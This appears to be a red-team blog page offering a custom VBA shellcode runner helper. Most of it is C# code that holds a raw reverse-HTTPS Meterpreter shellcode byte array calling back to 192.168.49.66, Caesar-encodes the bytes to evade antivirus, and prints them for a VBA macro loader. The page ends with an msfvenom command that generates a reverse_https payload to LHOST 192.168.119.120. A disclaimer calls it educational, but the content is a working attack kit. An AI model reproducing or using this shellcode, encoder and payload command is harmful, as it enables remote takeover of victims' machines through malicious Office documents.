<!DOCTYPE html>


<html lang="en">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; media-src 'self'; object-src 'self'; child-src 'self'; form-action 'none'; base-uri 'self'" />
<meta http-equiv="X-XSS-Protection"  content="1;mode=block" always>
<meta http-equiv="Referrer-Policy" content="no-referrer, strict-origin-when-cross-origin"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Custom VBA-ShellCode Runner</title>
 

  <link rel="stylesheet" type="text/css" href="/assets/main-hacker.css"></head>
<body>
    <div class="container"><header>
  <div class="menu">
    <ul>
      <li class="menu-first-child">
        <span>
          [cyberRat@RedTeam]~$
          <span class="blink">
            â–ˆ
          </span>
        </span>
      </li>
      <li>
        <a href="/">Home</a>
      </li>

    
      <li>
        <a href="/brainbox/">/BrainBox</a>
      </li> 
      <li>
        <a href="/resume/">/Resume</a>
      </li>

    </ul>
  </div>
</header>

<main>
      <p>All exploits are written my myself and are for educational purposes only, i would not be liable for any misuse!</p>

<p>###CUSTOM VBA SHELLCODE ENCRYPTER [HELPER] 
Generate a  vbapplication shellcode with the rat_helper.exe below</p>
<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Threading.Tasks</span><span class="p">;</span>

<span class="k">namespace</span> <span class="nn">helper</span>
<span class="p">{</span>
	<span class="k">internal</span> <span class="k">class</span> <span class="nc">Program</span>
	<span class="p">{</span>
		<span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="kt">byte</span><span class="p">[]</span> <span class="n">buf</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">598</span><span class="p">]</span> <span class="p">{</span>
			<span class="m">0xfc</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span><span class="m">0x8f</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x60</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xd2</span><span class="p">,</span><span class="m">0x64</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0xe5</span><span class="p">,</span>
			<span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x0c</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x14</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0x0f</span><span class="p">,</span><span class="m">0xb7</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x26</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x28</span><span class="p">,</span>
			<span class="m">0x31</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0xac</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x7c</span><span class="p">,</span><span class="m">0x02</span><span class="p">,</span><span class="m">0x2c</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0xcf</span><span class="p">,</span><span class="m">0x0d</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xc7</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span>
			<span class="m">0x75</span><span class="p">,</span><span class="m">0xef</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x10</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x42</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x40</span><span class="p">,</span><span class="m">0x78</span><span class="p">,</span>
			<span class="m">0x85</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x18</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd3</span><span class="p">,</span>
			<span class="m">0x85</span><span class="p">,</span><span class="m">0xc9</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x34</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd6</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span>
			<span class="m">0xcf</span><span class="p">,</span><span class="m">0x0d</span><span class="p">,</span><span class="m">0xac</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xc7</span><span class="p">,</span><span class="m">0x38</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0xf4</span><span class="p">,</span><span class="m">0x03</span><span class="p">,</span><span class="m">0x7d</span><span class="p">,</span><span class="m">0xf8</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x7d</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span>
			<span class="m">0x75</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd3</span><span class="p">,</span><span class="m">0x66</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x0c</span><span class="p">,</span><span class="m">0x4b</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x1c</span><span class="p">,</span>
			<span class="m">0x01</span><span class="p">,</span><span class="m">0xd3</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x04</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0x44</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span><span class="m">0x5b</span><span class="p">,</span><span class="m">0x5b</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span>
			<span class="m">0x5a</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x5f</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x12</span><span class="p">,</span><span class="m">0xe9</span><span class="p">,</span><span class="m">0x80</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0x5d</span><span class="p">,</span>
			<span class="m">0x68</span><span class="p">,</span><span class="m">0x6e</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x77</span><span class="p">,</span><span class="m">0x69</span><span class="p">,</span><span class="m">0x6e</span><span class="p">,</span><span class="m">0x69</span><span class="p">,</span><span class="m">0x54</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span><span class="m">0x77</span><span class="p">,</span><span class="m">0x26</span><span class="p">,</span>
			<span class="m">0x07</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xdb</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span><span class="m">0x3e</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span>
			<span class="m">0x4d</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x69</span><span class="p">,</span><span class="m">0x6c</span><span class="p">,</span><span class="m">0x6c</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x2f</span><span class="p">,</span><span class="m">0x35</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x28</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span><span class="m">0x69</span><span class="p">,</span>
			<span class="m">0x6e</span><span class="p">,</span><span class="m">0x64</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span><span class="m">0x77</span><span class="p">,</span><span class="m">0x73</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x4e</span><span class="p">,</span><span class="m">0x54</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x54</span><span class="p">,</span>
			<span class="m">0x72</span><span class="p">,</span><span class="m">0x69</span><span class="p">,</span><span class="m">0x64</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x6e</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0x2f</span><span class="p">,</span><span class="m">0x37</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x76</span><span class="p">,</span><span class="m">0x3a</span><span class="p">,</span>
			<span class="m">0x31</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span><span class="m">0x29</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x6c</span><span class="p">,</span><span class="m">0x69</span><span class="p">,</span><span class="m">0x6b</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x47</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x63</span><span class="p">,</span><span class="m">0x6b</span><span class="p">,</span>
			<span class="m">0x6f</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x3a</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x79</span><span class="p">,</span><span class="m">0xa7</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x03</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span>
			<span class="m">0x68</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span><span class="m">0x2f</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x2f</span><span class="p">,</span><span class="m">0x2d</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span>
			<span class="m">0x44</span><span class="p">,</span><span class="m">0x55</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x71</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x6d</span><span class="p">,</span><span class="m">0x46</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x77</span><span class="p">,</span>
			<span class="m">0x54</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x67</span><span class="p">,</span><span class="m">0x63</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0x43</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x39</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0x6d</span><span class="p">,</span><span class="m">0x39</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span>
			<span class="m">0x57</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0x35</span><span class="p">,</span><span class="m">0x77</span><span class="p">,</span><span class="m">0x6e</span><span class="p">,</span><span class="m">0x4f</span><span class="p">,</span><span class="m">0x44</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0x6b</span><span class="p">,</span><span class="m">0x45</span><span class="p">,</span><span class="m">0x64</span><span class="p">,</span><span class="m">0x6d</span><span class="p">,</span><span class="m">0x38</span><span class="p">,</span>
			<span class="m">0x34</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span><span class="m">0x47</span><span class="p">,</span><span class="m">0x54</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x39</span><span class="p">,</span><span class="m">0x77</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x38</span><span class="p">,</span><span class="m">0x67</span><span class="p">,</span><span class="m">0x5f</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span>
			<span class="m">0x41</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0x4f</span><span class="p">,</span><span class="m">0x4f</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0x4b</span><span class="p">,</span><span class="m">0x71</span><span class="p">,</span><span class="m">0x78</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span><span class="m">0x67</span><span class="p">,</span><span class="m">0x71</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span>
			<span class="m">0x4c</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x6b</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span><span class="m">0x67</span><span class="p">,</span><span class="m">0x62</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0x66</span><span class="p">,</span><span class="m">0x4e</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x35</span><span class="p">,</span>
			<span class="m">0x73</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x4f</span><span class="p">,</span><span class="m">0x37</span><span class="p">,</span><span class="m">0x35</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0x4e</span><span class="p">,</span><span class="m">0x39</span><span class="p">,</span><span class="m">0x47</span><span class="p">,</span><span class="m">0x79</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span><span class="m">0x6b</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x6b</span><span class="p">,</span>
			<span class="m">0x4c</span><span class="p">,</span><span class="m">0x4e</span><span class="p">,</span><span class="m">0x79</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x66</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0x66</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0x63</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span>
			<span class="m">0x46</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x6d</span><span class="p">,</span><span class="m">0x46</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x67</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x4d</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x44</span><span class="p">,</span><span class="m">0x35</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x45</span><span class="p">,</span><span class="m">0x63</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span>
			<span class="m">0x74</span><span class="p">,</span><span class="m">0x6c</span><span class="p">,</span><span class="m">0x45</span><span class="p">,</span><span class="m">0x43</span><span class="p">,</span><span class="m">0x4d</span><span class="p">,</span><span class="m">0x6d</span><span class="p">,</span><span class="m">0x6b</span><span class="p">,</span><span class="m">0x67</span><span class="p">,</span><span class="m">0x63</span><span class="p">,</span><span class="m">0x71</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x6d</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x2d</span><span class="p">,</span><span class="m">0x66</span><span class="p">,</span>
			<span class="m">0x6e</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0x9f</span><span class="p">,</span><span class="m">0xc6</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0xc6</span><span class="p">,</span>
			<span class="m">0x53</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span><span class="m">0x84</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0xeb</span><span class="p">,</span><span class="m">0x55</span><span class="p">,</span>
			<span class="m">0x2e</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x96</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x0a</span><span class="p">,</span><span class="m">0x5f</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x80</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span>
			<span class="m">0x6a</span><span class="p">,</span><span class="m">0x04</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x1f</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0x46</span><span class="p">,</span><span class="m">0x9e</span><span class="p">,</span><span class="m">0x86</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span>
			<span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x2d</span><span class="p">,</span><span class="m">0x06</span><span class="p">,</span><span class="m">0x18</span><span class="p">,</span><span class="m">0x7b</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0x14</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span>
			<span class="m">0x88</span><span class="p">,</span><span class="m">0x13</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x44</span><span class="p">,</span><span class="m">0xf0</span><span class="p">,</span><span class="m">0x35</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x4f</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0xcd</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span>
			<span class="m">0x4a</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x40</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x10</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x40</span><span class="p">,</span>
			<span class="m">0x00</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0xa4</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0xe5</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x93</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0xe7</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span>
			<span class="m">0x68</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x12</span><span class="p">,</span><span class="m">0x96</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0xe2</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span>
			<span class="m">0xc0</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0xcf</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x07</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xc3</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0xe5</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0xc3</span><span class="p">,</span><span class="m">0x5f</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span>
			<span class="m">0x6b</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0x39</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0x38</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x34</span><span class="p">,</span><span class="m">0x39</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span>
			<span class="m">0x36</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0xf0</span><span class="p">,</span><span class="m">0xb5</span><span class="p">,</span><span class="m">0xa2</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span> <span class="p">};</span>
			<span class="c1">// ceaser encoder</span>
			<span class="kt">byte</span><span class="p">[]</span> <span class="n">encoded</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="n">buf</span><span class="p">.</span><span class="n">Length</span><span class="p">];</span>
			<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">buf</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span>
			<span class="p">{</span>
				<span class="n">encoded</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)(((</span><span class="kt">uint</span><span class="p">)</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">+</span> <span class="m">2</span><span class="p">)</span> <span class="p">&amp;</span> <span class="m">0xFF</span><span class="p">);</span>
			<span class="p">}</span>

			<span class="kt">uint</span> <span class="n">counter</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
			<span class="c1">//convert byte array toa string using the String builder class</span>
			<span class="n">StringBuilder</span> <span class="n">hex</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">(</span><span class="n">encoded</span><span class="p">.</span><span class="n">Length</span> <span class="p">*</span> <span class="m">2</span><span class="p">);</span>
			<span class="k">foreach</span> <span class="p">(</span><span class="kt">byte</span> <span class="n">b</span> <span class="k">in</span> <span class="n">encoded</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="n">hex</span><span class="p">.</span><span class="nf">AppendFormat</span><span class="p">(</span><span class="s">"{0:D}, "</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
				<span class="n">counter</span><span class="p">++;</span>
				<span class="k">if</span> <span class="p">(</span><span class="n">counter</span> <span class="p">%</span> <span class="m">50</span> <span class="p">==</span> <span class="m">0</span><span class="p">)</span>
				<span class="p">{</span>
					<span class="n">hex</span><span class="p">.</span><span class="nf">AppendFormat</span><span class="p">(</span><span class="s">"_{0}"</span><span class="p">,</span> <span class="n">Environment</span><span class="p">.</span><span class="n">NewLine</span><span class="p">);</span>
				<span class="p">}</span>
			<span class="p">}</span>
			<span class="c1">// print encoded shelllcode to screen</span>
			<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"The VBA payload is: "</span> <span class="p">+</span> <span class="n">hex</span><span class="p">.</span><span class="nf">ToString</span><span class="p">());</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>

<p>Now Input the output of the helper.exe {which is an encrypted reverse shellcode}into the VB shellcode runner below</p>

<p>msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication</p>

